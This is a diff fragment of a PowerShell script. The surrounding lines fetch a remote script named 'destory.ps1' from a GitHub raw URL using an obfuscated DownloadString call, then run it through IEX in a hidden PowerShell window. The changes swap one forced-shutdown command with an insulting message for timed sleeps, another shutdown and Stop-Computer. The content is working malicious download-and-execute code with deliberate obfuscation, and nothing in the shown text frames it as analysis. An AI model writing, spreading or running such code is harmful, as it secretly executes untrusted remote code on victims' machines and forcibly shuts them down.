@@ -21,4 +21,7 @@ Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -Pas
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
-shutdown /s /t 15 /c "Fuck you :)"
+Start-Sleep -Seconds 15
+shutdown /s /t 15 /c "Good look!"
+Start-Sleep -Seconds 1
+Stop-Computer
